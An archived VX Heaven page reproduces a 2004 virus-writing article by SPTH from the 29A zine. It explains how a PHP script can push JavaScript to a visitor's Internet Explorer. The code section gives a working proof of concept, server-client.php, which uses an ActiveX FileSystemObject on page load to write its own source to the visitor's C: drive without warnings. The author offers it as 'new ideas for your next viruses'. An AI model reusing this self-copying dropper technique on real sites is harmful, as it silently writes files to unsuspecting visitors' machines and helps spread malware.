<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Server -> Client Communtication for Preprocessor languages (PHP)' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Server -&gt; Client Communtication for Preprocessor languages (PHP), words, article, user, page, server, language, spth, script, client, code, technique, file, viruses, html, idea"/>
<meta name="Description" content="A 'Preprocessor language' is a web-based language, which has been done to run on a server, and only on the server. The results by the executed web-based preprocessor script (like PHP) file will be transfered to the Webpage, which can be seen by the user. That means, the user will never see the code of that script. As a result, the script can not harm the user in any way, because it is executed on the server, (and only there) and just the results are send to the user. This has been also written in VirusBulletin March/2001 in an article by Denis Zenlin &amp;amp; Mike Pavlushchik called 'PHP go the Script Viruses'. The article deals with the PHP.Pirus (29a#5) and PHP.NewWorld and the common PHP problem. A very important statement of the article: '... and it does not have the ability to spread to other Web sites or PCs of the visitors who view an HTML page containing a malicious PHP script. This last case is not possible simply because a user receives a pure HTML page with absolutely no script inside from the PHP processor...' Well, that's not true at all, which I will prove in this article. :)"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"604c34d214b3d3d3d4f81c5803c1335f0d40394a-1498757125-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp13.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Server -> Client Communtication for Preprocessor languages (PHP)</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em>29A#8</em><br/> <em>November 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp13.html';</script><div class="ci"><a href="/lib/?ci=vsp13">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp13">Back to index</a>] [<a href="/lib/vsp13.html#disqus_thread">Comments</a>]<br/> 
<h2>Index</h2>
<ol start="0">
<li>Intro Words</li>
<li>The idea (Theory)</li>
<li>The code</li>
<li>Last Words</li>
</ol>
<h2>0) Intro Words</h2>
<p>A 'Preprocessor language' is a web-based language, which has been done to run on a server, and only on the server. The results by the executed web-based preprocessor script (like PHP) file will be transfered to the Webpage, which can be seen by the user. That means, the user will never see the code of that script. As a result, the script can not harm the user in any way, because it is executed on the server, (and only there) and just the results are send to the user. This has been also written in VirusBulletin March/2001 in an article by Denis Zenlin &amp; Mike Pavlushchik called 'PHP go the Script Viruses'. The article deals with the PHP.Pirus (29a#5) and PHP.NewWorld and the common PHP problem. A very important statement of the article: '... and it does not have the ability to spread to other Web sites or PCs of the visitors who view an HTML page containing a malicious PHP script. This last case is not possible simply because a user receives a pure HTML page with absolutely no script inside from the PHP processor...' Well, that's not true at all, which I will prove in this article. :)</p>
<h2>1) The idea (Theory)</h2>
<p>It is very true that the PHP code is executed on the server, and just on the server. And it returns just the pure HTML code. That made me think about that topic more intensive. Finally I got an idea: If the PHP script returns a HTML code, and HTML codes could contain '&lt;script&gt;' tags with viruses, it should be possible to make a PHP virus processed on the server, but affecting the client. I tried it with a simple JavaScript in the body, but it didn't work, because the JavaScript code will not executed directly. Why not? I don't really know, I think because the execution of the HTML is already after the returned JavaScript code. That made me feel strange: I know the code is there in the HTML (you can see the HTML code in your IE ;), but it isn't executed (=don't work). After alot of thinking I got the final idea: I let the JavaScript be a function in the &lt;head&gt;-tag and call it via &lt;body language ... &gt;. And this one worked.</p>
<p>OK, what we need:</p>
<ul>
<li>A PHP code returning (via for example 'echo') a JavaScript code.</li>
<li>The PHP code is in the &lt;head&gt;-tag of the new generated HTML file, which means that the returned JavaScript is also in the &lt;head&gt;-tag.</li>
<li>The JavaScript (which will be executed on the client) creates a file with the full content of the PHP-virus.</li>
<li>Call the JavaScript function in the &lt;head&gt; via &lt;body language ... &gt;.</li>
</ul>
<p>A really quite cool side-effect is this one: Normally, if you have a Web-Page containing a JavaScript code, the user will get two warnings:</p>
<ol>
<li>The WinXP SP2 warning, that a script should be executed.</li>
<li>The IE warning, that WScript should be used by the script.</li>
</ol>
<p>After these two messages, the user will be that scared of the page, that (s)he will not accept execution of the script.</p>
<p>Now the side effect: If you use this technique, and somebody runs it, there are NO (!!!) warnings, error-messages or informations about the danger of script. It just will be executed, that's all. :)</p>
<h2>2) The code</h2>
<p>Well, now you should understand the idea, how it works (I hope so :D). Now let's move to the code! I've tested the code on my WinXP SP2 + IE 6.0 with PHP 5.0.2 on my computer (where I'm server + client) and on a www.host.sk domain, where I'm just a client. And, surprise/surprise, it worked anyway. ;) The following code will create a file called 'spth.php' on the harddisk C with it's own code, if a user (client) runs it. And most important: There will be NO warnings about the script. :) Now have a look at the code:</p>
<p><strong>server-client.php</strong></p>
<div class="php" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">&lt;?</span><br/>
<span style="color: #000088;">$nl</span><span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">13</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'&lt;html&gt;&lt;head&gt;'</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'&lt;script language='</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'JavaScript'</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'&gt;'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'function go(){'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'var fso=new ActiveXObject('</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'Scripting.FileSystemObject'</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">')'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'var file=fso.CreateTextFile('</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'C:\\\spth.php'</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">')'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #000088;">$cont</span><span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.php.net/fread"><span style="color: #990000;">fread</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.php.net/fopen"><span style="color: #990000;">fopen</span></a> <span style="color: black;">&#40;</span><span style="color: #009900; font-weight: bold;">__FILE__</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'r'</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><a style="color: #000060;" href="http://www.php.net/filesize"><span style="color: #990000;">filesize</span></a><span style="color: black;">&#40;</span><span style="color: #009900; font-weight: bold;">__FILE__</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000088;">$i</span><span style="color: #339933;">=</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span><span style="color: #000088;">$nc</span><span style="color: #339933;">=</span><span style="color: #0000ff;">''</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'file.Write('</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #000088;">$i</span><span style="color: #339933;">&lt;</span><a style="color: #000060;" href="http://www.php.net/strlen"><span style="color: #990000;">strlen</span></a><span style="color: black;">&#40;</span><span style="color: #000088;">$cont</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'String.fromCharCode('</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/ord"><span style="color: #990000;">ord</span></a><span style="color: black;">&#40;</span><span style="color: #000088;">$cont</span><span style="color: black;">&#123;</span><span style="color: #000088;">$i</span><span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">')+'</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #000088;">$i</span><span style="color: #339933;">++;</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: #b1b100;">echo</span> <a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><a style="color: #000060;" href="http://www.php.net/chr"><span style="color: #990000;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">34</span><span style="color: black;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">')'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'file.Close()}'</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">'&lt;/script&gt;&lt;/head&gt;'</span><span style="color: #339933;">;</span><span style="color: #000088;">$nl</span><span style="color: #339933;">.</span><span style="color: #000088;">$nl</span><span style="color: #339933;">;</span><br/>
<span style="color: #000000; font-weight: bold;">?&gt;</span><br/>
<br/>
&lt;body language=&quot;JavaScript&quot; onload=&quot;go()&quot;&gt;&lt;/body&gt;&lt;/html&gt;<br/>
&nbsp;</div>
<h2>3) Last Words</h2>
<p>This technique is a prove that PHP can affect the user (client), even many people denied it. Beside of the problem that PHP is not that secure, the technique is very dangerous because there are NO warnings, the script just works without any messange, and the user don't even recognize it. It would be able to make a fully virus with this technique, which infects the users HD, and (s)he would not recognize it. Therefore such a creature could be easiely get in the wild.</p>
<p>That result makes me happy, because two new things has been discovered. I hope I gave you with that article some help or maybe new ideas for your next viruses...</p>
<pre>
                                                        - - - - - - - - - - - - - - -
                                                          Second Part To Hell/[rRlf]  
                                                          www.spth.de.vu
                                                          <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="97e4e7e3ffd7e7e5fef2e4e3b9f4f8fa">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
                                                          written from november 2004
                                                          Austria
                                                        - - - - - - - - - - - - - - - </pre> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp13">de</a><a href="/lib/index.php?lang=en&amp;id=vsp13">en</a><a href="/lib/index.php?lang=es&amp;id=vsp13">es</a><a href="/lib/index.php?lang=it&amp;id=vsp13">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp13">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp13">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp13">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp13">ua</a></div>
</body>
</html>
